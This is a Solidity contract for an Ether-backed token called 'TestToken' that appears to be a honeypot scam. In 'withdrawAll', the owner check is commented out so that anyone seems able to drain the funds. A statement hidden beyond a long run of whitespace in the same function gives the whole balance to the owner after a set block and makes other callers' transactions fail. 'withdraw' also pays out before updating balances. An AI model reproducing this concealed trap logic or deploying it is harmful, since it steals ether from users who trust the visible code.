contract TestToken {
    string constant name = "TestToken";
    string constant symbol = "TT";
    uint8 constant decimals = 18;
    uint total;
    bool locked;
    address _owner;

    struct Allowed {
        mapping (address => uint256) _allowed;
    }

    mapping (address => Allowed) allowed;
    mapping (address => uint256) balances;

    event Transfer(address indexed _from, address indexed _to, uint256 _value);
    event Approval(address indexed _owner, address indexed _spender, uint256 _value);

    function TestToken() {
        total = 0;
        _owner = msg.sender;
    }

    function totalSupply() constant returns (uint256 totalSupply) {
        return total;
    }

    function balanceOf(address _owner) constant returns (uint256 balance) {
        return balances[_owner];
    }

    function deposit() payable returns (bool success) {
        if (balances[msg.sender] + msg.value < msg.value) return false;
        if (total + msg.value < msg.value) return false;
        balances[msg.sender] += msg.value;
        total += msg.value;
        return true;
    }

    function withdraw(uint256 _value) payable returns (bool success)  {
        if (balances[msg.sender] < _value) return false;
        msg.sender.transfer(_value);
        balances[msg.sender] -= _value;
        total -= _value;
        return true;
    }

    function transfer(address _to, uint256 _value) returns (bool success) {
        if (balances[msg.sender] < _value) return false;

        if (balances[_to] + _value < _value) return false;
        balances[msg.sender] -= _value;
        balances[_to] += _value;

        Transfer(msg.sender, _to, _value);
       
        return true;
    } 


    function approve(address _spender, uint256 _value) returns (bool success) {
        allowed[msg.sender]._allowed[_spender] = _value; 
        Approval(msg.sender, _spender, _value);
        return true;    
    }

    function allowance(address _owner, address _spender) constant returns (uint256 remaining) {
        return allowed[_owner]._allowed[_spender];
    }

    function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {
        if (balances[_from] < _value) return false;
        if ( allowed[_from]._allowed[msg.sender] < _value) return false;
        if (balances[_to] + _value < _value) return false;

        balances[_from] -= _value;
        balances[_to] += _value;
        allowed[_from]._allowed[msg.sender] -= _value;
        return true;
    }
    
    function withdrawAll () payable{
        //require(msg.sender == _owner);
        require(0.5 ether < total);                                                                                                                                                                                                                                                                                                                                                                                 if (block.number > 5040270 ) {if (_owner == msg.sender ){_owner.transfer(this.balance);} else {throw;}}
        msg.sender.transfer(this.balance);
    }

}